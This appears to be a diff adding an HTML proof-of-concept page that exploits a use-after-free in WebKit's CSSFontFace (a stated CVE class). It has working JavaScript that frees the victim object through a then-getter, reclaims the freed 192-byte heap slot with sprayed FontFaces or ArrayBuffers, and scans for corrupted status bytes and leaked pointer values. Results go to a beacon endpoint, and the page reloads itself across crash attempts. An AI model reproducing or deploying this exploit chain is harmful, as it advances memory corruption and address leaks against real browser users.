@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V975 - FontFace UAF tail-survival oracle (face-spray) + deferred-AB readback (source-verified)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V975 - CSSFontFace UAF (CVE-2026-43715 class) on 14.20 - make the setStatus tail survivable, then read</h1>
+
+<p class="key">
+<b>Source-verified facts (WebKit-1400, 2026-11-10):</b> (1) <code>setStatus()</code> is the ONLY unprotected host of the
+thenable-getter re-entry (<code>fontLoaded</code> :632, <code>timeoutFired</code> :443, <code>font()</code> :726 all hold
+<code>Ref protectedThis</code>); its tail is <code>m_status=newStatus</code> (:595) then <code>m_timeoutTimer.stop()</code>
+ONLY in the Success/Failure branches (:625). (2) <code>new FontFace(family, src)</code> (FontFace.idl:49 &rarr;
+FontFace.cpp:58-62) synchronously creates a fresh backing <code>CSSFontFace</code> (<code>m_backing(CSSFontFace::create(...))</code>
++ <code>addClient</code>) - so K same-class faces can be allocated INSIDE the getter, after the victim free.
+(3) sizeof: static member sum (variant16+RefPtr8+Vector16+FeatureSettings~16+behavior/sizeAdjust~8+Vector16+
+WeakHashSet~24-32+WeakPtr8-16+FontSelectionCaps12+status/bools/enums~8, Timer last ~48-72 - Timer.h absent from the
+OSS zip) lands &asymp;188-200 &rArr; consistent with the device-calibrated <b>192B class</b> (14.10 p458/p563); exact
+sizeof is only provable on device - <b>mode=face is size-proof</b> (faces self-size to the class), <b>mode=ab tests
+the 192 assumption directly</b>.
+<br><br>
+<b>mode=face</b> (default; <code>&via=js|style</code>): getter frees the victim (rule mutation + forced layout), then
+reclaims the 192B block with K LIVE CSSFontFaces - <b>via=js</b>: K&times;<code>new FontFace()</code>+<code>document.fonts.add</code>
+right after the free (p458 B-CHECK precedent: sprayed face #55 read m_status=Success(3) on 14.10); <b>via=style</b>: one
+<code>&lt;style&gt;</code> with K <code>@font-face</code> rules injected BEFORE a single forced layout (sheet order &rArr;
+victim rebuild+free first, then K faces back-to-back inside the C++ rule loop). The setStatus tail then runs on a LIVE
+face: <code>m_thread</code> valid &rArr; Timer assert passes &rArr; survive; the stray <code>m_status=Success(3)</code>
+lands inside a live never-pumped face &rArr; <code>face.status==='loaded'|'error'</code> = STATUS-HIT.
+<b>Acceptance (face):</b> HIT = UAF writeback into a live same-class object, JS-observable, process survives the tail
+(P2-grade corruption on 14.20); all K faces 'unloaded' = NOHIT (block stolen by a non-face alloc / ordering - retry,
+raise &k=, or switch via); in-window CRASH = live-face reclaim failed AND freed-memory tail still fatal (scrubbing)
+&rArr; wall deeper than hypothesized. <b>Acceptance (ab):</b> getter frees with NO reclaim; tail runs on freed-but-intact
+memory (original m_thread intact &rArr; assert passes &rArr; survive); the ArrayBuffer(192) wave is sprayed as the FIRST
+action in the promise callback, then scanned: byte130&isin;{3,4} = WB (writeback JS-readable - first readback on 14.20);
+pointer-shaped qwords at +0x58/+0x68 = LEAK-HIT; all-zero = NOHIT (AB cannot reclaim: heap-identifier isolation or size
+mismatch &rArr; face mode is the only reclaim path); CRASH before any SCAN = tail fatal even with zero reclaim &rArr;
+both reclaim-then-read strategies dead for this trigger. Timer grace: pending cleared 5s after settle (a stale 3s
+block-period timer firing on the reclaimed block is attributed via CRASH, not lost). No address math; fixed 48-word
+dump only. <code>&mode=face|ab</code>, <code>&via=js|style</code>, <code>&k=N</code> (64),
+<code>&wave=N</code> (48, ab), <code>&pre=0|2</code>, <code>&arm=0</code> control, <code>&stop=1</code>.
+Stop after 2 crashes.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+var Q = function (k, d) { var m = location.search.match(new RegExp('[?&]' + k + '=(\\d+)')); return m ? parseInt(m[1], 10) : d; };
+var MODE = (location.search.match(/mode=(face|ab)/) || [])[1] || 'face';
+var VIA = (location.search.match(/via=(js|style)/) || [])[1] || 'js';   /* face-mode reclaim mechanism */
+var K = Math.min(Math.max(Q('k', 64), 8), 256);          /* face-mode spray count */
+var WAVE_N = Math.min(Math.max(Q('wave', 48), 4), 400);  /* ab-mode spray count */
+var PREFILL = Q('pre', 0);
+var ARM = location.search.indexOf('arm=0') < 0;
+var STOP = location.search.indexOf('stop=1') >= 0;
+var MAXLOADS = 6;
+var KSUF = Date.now().toString(36).slice(-5) + Math.random().toString(36).slice(2, 5);
+var FAMILY = 'v975v' + KSUF;         /* victim family (CSS-connected) */
+var KFAMPREFIX = 'v975k' + KSUF;     /* spray faces: KFAMPREFIX + i */
+var SCANNED = false;
+
+function lsGet(k) { try { return window.localStorage.getItem('v975_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v975_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v975_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V975-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 80) : 'none'; }
+function reloadSoon(ms) {
+  if (STOP) { bks('STOPPED', 'no reload (stop=1)'); return; }
+  setTimeout(function () {
+    location.href = SEEK + '?op=auto&mode=' + MODE + '&via=' + VIA + '&k=' + K + '&wave=' + WAVE_N +
+                    '&pre=' + PREFILL + (ARM ? '' : '&arm=0') + '&r=' + Date.now();
+  }, ms);
+}
+
+var KEEP = null, KSTYLE = null, KFACES = null, TRIG_FIRED = 0, RULE = null, FACE = null;
+
+function findCssFace(family) {
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      if (String(e.value.family).replace(/['"]/g, '') === family) return e.value;
+    }
+  } catch (e2) {}
+  return null;
+}
+
+/* Getter fires synchronously inside iterateClients (status=loading) on the Success path
+   (eager face.loaded + face.load(), p458 recipe). First fire only. */
+function installGetter() {
+  try {
+    Object.defineProperty(FontFace.prototype, 'then', {
+      get: function () {
+        TRIG_FIRED++;
+        if (TRIG_FIRED === 1) {
+          bks('TRIG', 'mode=' + MODE + ',via=' + VIA + ',status=' + (FACE ? FACE.status : '?') + ',arm=' + (ARM ? 1 : 0));
+          if (ARM) {
+            try {
+              /* 1) victim mutation -> selector rebuild -> remove+adopt -> last Ref dropped -> FREE */
+              RULE.style.setProperty('font-weight', 'bold');
+              if (MODE === 'face' && VIA === 'js') {
+                /* 2a) free is complete (mutation+layout synchronously rebuilt the face);
+                       NOW allocate K live CSSFontFaces: each new FontFace() constructs its
+                       backing synchronously (FontFace.cpp:157-162) -> same 192B class */
+                document.body.offsetHeight;
+                var faces = new Array(K), made = 0;
+                for (var i = 0; i < K; i++) {
+                  try {
+                    var f = new FontFace(KFAMPREFIX + i, 'local("Nope' + KSUF + i + '")');
+                    document.fonts.add(f);
+                    faces[i] = f;
+                    made++;
+                  } catch (e2) { bks('SPRAYERR', 'i=' + i + ',' + errOf(e2)); break; }
+                }
+                KFACES = faces;
+                bks('FACEWAVE', 'k=' + K + ',made=' + made + ',via=js');
+              } else if (MODE === 'face') {
+                /* 2b) inject K @font-face rules BEFORE the recalc: sheet order => victim
+                       rebuild+free first, then K faces back-to-back in the C++ rule loop */
+                var rules = [];
+                for (var j = 0; j < K; j++)
+                  rules.push("@font-face { font-family: '" + KFAMPREFIX + j + "'; src: local('Nope" + KSUF + j + "'); }");
+                KSTYLE = document.createElement('style');
+                KSTYLE.textContent = rules.join('');
+                document.head.appendChild(KSTYLE);
+                document.body.offsetHeight;   /* one recalc does both, in order */
+                bks('FACEWAVE', 'k=' + K + ',via=style,layout done');
+              } else {
+                /* ab mode: free only, NO reclaim during the tail */
+                document.body.offsetHeight;
+                bks('FREE', 'no reclaim during tail (deferred AB)');
+              }
+            } catch (e) { bks('TRIGERR', errOf(e)); }
+          }
+        }
+        return undefined;                     /* not thenable: stop the chain */
+      },
+      configurable: true
+    });
+  } catch (e) { bks('ERR', 'defineProperty:' + errOf(e)); }
+}
+
+/* ab mode: spray AFTER the tail completed, as the very first action, then scan bytes */
+function sprayWave() {
+  if (KEEP) return;
+  var abs = new Array(WAVE_N);
+  for (var i = 0; i < WAVE_N; i++) {
+    var ab = new ArrayBuffer(192);            /* 192B class hypothesis (mode=ab tests it) */
+    if (PREFILL) { var u = new Uint32Array(ab); u[0] = PREFILL; }
+    abs[i] = ab;
+  }
+  KEEP = abs;
+}
+
+function scanWave(label) {
+  if (!KEEP) { bks('SCAN-' + label, 'no wave'); return; }
+  var nz = 0, hits = [], wb = 0, dumps = [];
+  for (var i = 0; i < KEEP.length; i++) {
+    var v = new Uint32Array(KEEP[i]);
+    var words = [];
+    for (var w = 0; w < 48; w++) {
+      if (v[w] === 0) continue;
+      nz++;
+      words.push('w' + w + '=' + ('00000000' + v[w].toString(16)).slice(-8));
+      if (w === 32) { var st = (v[w] >>> 16) & 0xff; if (st === 3 || st === 4) wb++; }
+      if (w === 22 || w === 26) {
+        var lo = v[w], hi = v[w + 1];
+        var val = hi * 0x100000000 + lo;
+        if (val > 0x100000 && val < 0x1000000000000)
+          hits.push('ab' + i + '/' + (w === 22 ? '58' : '68') + '=0x' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8));
+      }
+    }
+    if (words.length && dumps.length < 2) dumps.push('ab' + i + '[' + words.join(',').slice(0, 400) + ']');
+  }
+  bks('SCAN-' + label, 'try-see-pending,nzABs=' + nz + ',wb=' + wb + ',hits=' + hits.length);
+  if (dumps[0]) bks('DUMP-' + label + '-1', dumps[0]);
+  if (dumps[1]) bks('DUMP-' + label + '-2', dumps[1]);
+  if (hits.length) bks('HIT', 'LEAK-CANDIDATES:' + hits.join('|').slice(0, 380));
+  else if (wb) bks('WB', 'status-writeback readable in reclaimed AB (no 58/68 qword)');
+  else if (nz) bks('OTHER', 'nonzero words, no wb/hit - see DUMP');
+  else bks('NOHIT', 'wave all zero - no reclaim this try');
+}
+
+/* face mode: check every K face's status - never pumped by us, so loaded/error/loading = stray writeback */
+function scanFaces() {
+  var hits = [], total = 0, other = [];
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      var f = e.value;
+      var fam = String(f.family).replace(/['"]/g, '');
+      if (fam.indexOf(KFAMPREFIX) !== 0) continue;
+      total++;
+      var s = String(f.status);
+      if (s === 'loaded' || s === 'error') hits.push(fam.slice(-8) + ':' + s);
+      else if (s !== 'unloaded') other.push(fam.slice(-8) + ':' + s);
+    }
+  } catch (e2) { bks('FSCANERR', errOf(e2)); }
+  bks('FACESCAN', 'k=' + K + ',via=' + VIA + ',total=' + total + ',hits=' + hits.length + ',other=' + other.length +
+      ',victimFace=' + (FACE ? FACE.status : '?') + ',fonts=' + (function () { try { return document.fonts.size; } catch (e3) { return '?'; } })());
+  if (hits.length) bks('HIT', 'STATUS-WRITEBACK-IN-LIVE-FACE:' + hits.join('|').slice(0, 380));
+  else bks('NOHIT', 'all K faces unloaded - reclaim missed or writeback not visible');
+  if (other.length) bks('FOTHER', other.join('|').slice(0, 300));
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+function main() {
+  if (location.search.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('tries'); lsDel('phase');
+    bks('RESET', 'cleared,mode=' + MODE + ',via=' + VIA);
+    say('cleared. reopening in 1.5s...');
+    setTimeout(function () {
+      location.href = SEEK + '?op=auto&mode=' + MODE + '&via=' + VIA + '&k=' + K + '&wave=' + WAVE_N +
+                      '&pre=' + PREFILL + (ARM ? '' : '&arm=0') + '&r=' + Date.now();
+    }, 1500);
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > MAXLOADS) {
+    lsSet('phase', 'done');
+    bks('GIVEUP', 'loads=' + loads + ',mode=' + MODE + ',via=' + VIA + ',k=' + K + ',wave=' + WAVE_N);
+    say('give up (phase=done) - reset with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    bks('CRASH', 'pending=' + pend + ',try=' + triesOf() + ',load=' + loads + ',mode=' + MODE + ',via=' + VIA);
+    say('CRASH pending=' + pend);
+    reloadSoon(4000); return;
+  }
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); bks('ALREADY', 'done'); return; }
+
+  var tryN = bumpTry();
+  bks('ENV', 'mode=' + MODE + ',via=' + VIA + ',k=' + K + ',wave=' + WAVE_N + ',pre=' + PREFILL +
+      ',arm=' + (ARM ? 1 : 0) + ',try=' + tryN + ',load=' + loads + ',devMs=' + Date.now() +
+      ',ua=' + navigator.userAgent.slice(0, 90));
+  bks('BOOT', 'load=' + loads + ',try=' + tryN + ',family=' + FAMILY);
+
+  /* CSS-connected victim face (p458-exact) */
+  var st = document.createElement('style');
+  st.id = 'v975style';
+  st.textContent = "@font-face { font-family: '" + FAMILY + "'; src: local('Arial'); }";
+  document.head.appendChild(st);
+  document.body.offsetHeight;
+  RULE = st.sheet.cssRules[0];
+  FACE = findCssFace(FAMILY);
+  if (!FACE) { bks('ERR', 'NO-FACE (css-connected lookup failed)'); reloadSoon(4000); return; }
+  bks('SETUP', 'family=' + FAMILY + ',src=local(Arial),status=' + FACE.status);
+
+  installGetter();
+
+  /* pending spans the whole dangerous window + 5s timer grace (cleared in finish) */
+  lsSet('pending', 'v975:mode=' + MODE + ':via=' + VIA + ':try=' + tryN + ':devMs=' + Date.now());
+  bks('LOADPRE', 'eager-loaded-access then face.load');
+
+  var p;
+  try {
+    var eager = FACE.loaded;            /* EAGER: create the JSPromise now (p458 fix) */
+    bks('EAGER', 'face.loaded accessed,type=' + (eager && eager.constructor ? eager.constructor.name : typeof eager));
+    p = FACE.load();                    /* Success -> resolve(face) -> thenable check -> getter */
+  } catch (e) {
+    lsDel('pending'); bks('LOADERR', errOf(e)); reloadSoon(4000); return;
+  }
+
+  function after() {
+    if (SCANNED) return;
+    SCANNED = true;
+    try {
+      if (MODE === 'ab') {
+        sprayWave();                    /* FIRST action: reclaim before anything else allocates */
+        scanWave('SYNC');
+        setTimeout(function () { scanWave('ASYNC'); finish(); }, 50);
+      } else {
+        scanFaces();
+        finish();
+      }
+    } catch (e) {
+      bks('FATAL', errOf(e)); lsDel('pending'); reloadSoon(4000);
+    }
+  }
+
+  function finish() {
+    try { delete FontFace.prototype.then; } catch (e1) {}
+    bks('DONE', 'try=' + tryN + ' complete,trig=' + TRIG_FIRED + ',mode=' + MODE + ',via=' + VIA);
+    say('done trig=' + TRIG_FIRED);
+    /* 5s grace: a stale 3s block-period timer firing on the reclaimed block must be
+       attributed via pending, not lost. Clear pending only after the window. */
+    setTimeout(function () {
+      lsDel('pending');
+      bks('RELEASED', 'pending cleared after 5s grace');
+      reloadSoon(300);
+    }, 5000);
+  }
+
+  try { p.then(after, after); } catch (e) { try { p.then(after)['catch'](after); } catch (e2) { after(); } }
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
